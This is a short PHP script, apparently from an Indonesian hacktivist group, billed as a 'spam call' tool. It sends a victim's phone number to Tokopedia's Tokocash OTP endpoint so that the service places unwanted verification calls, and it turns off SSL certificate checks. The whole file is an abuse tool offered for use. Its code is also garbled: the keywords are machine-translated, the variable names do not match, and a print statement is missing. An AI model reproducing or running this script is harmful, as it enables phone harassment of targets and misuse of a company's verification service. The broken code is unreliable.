<? php
// Batasi 3x Telpon Setiap Satu Nomor
fungsi  kirim ( $ telepon ) {
        $ ch  =  curl_init ();
        curl_setopt ( $ ch , CURLOPT_URL , " https://www.tokocash.com/oauth/otp " );                      curl_setopt ( $ ch , CURLOPT_SSL_VERIFYPEER , false );
        curl_setopt ( $ ch , CURLOPT_FOLLOWLOCATION , true );
        curl_setopt ( $ ch , CURLOPT_RETURNTRANSFER , true );
        curl_setopt ( $ ch , CURLOPT_HEADER , true );
        curl_setopt ( $ ch , CURLOPT_POST , 1 );
        curl_setopt ( $ ch , CURLOPT_POSTFIELDS , " msisdn = $ phone & accept = call " );                        $ asw  =  curl_exec ( $ ch );
        curl_close ( $ ch );
                echo  $ asw . " \ n " ;
}
gema  "
############################################### ###########
    SPAM CALL VIA -> TOKOPEDIA
        CREATED: MAKASSAR CYBER ARMY {M.C.A}
        BY: DARK•PSYCHO
        #SALAMHACKTIVIS
     Penggunaannya-> Bisa Menggunakan Nomor Berawalan [08/62]
############################################### ######### \ n " ;
  " Nomor \ n Input: " ;
$ nomor  =  trim ( fgets ( STDIN ));
$ execute  = kirim ( $ nomor );
print  $ execute ;
? >